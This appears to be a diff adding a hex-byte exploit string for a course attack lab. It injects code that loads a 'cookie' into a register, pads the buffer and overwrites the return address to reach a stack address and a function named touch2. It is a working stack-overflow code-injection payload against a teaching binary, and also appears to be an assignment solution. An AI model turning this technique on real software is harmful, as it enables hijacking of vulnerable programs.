@@ -1,0 +1,9 @@
+48 c7 c7 d1 f3 3f 4f c3 /* pass my cookie */
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 b0 62 55 00 00 00 00 /* address of %rsp register in little endian */
+f1 16 40 00 00 00 00 00 /* address of touch2 function in little endian */
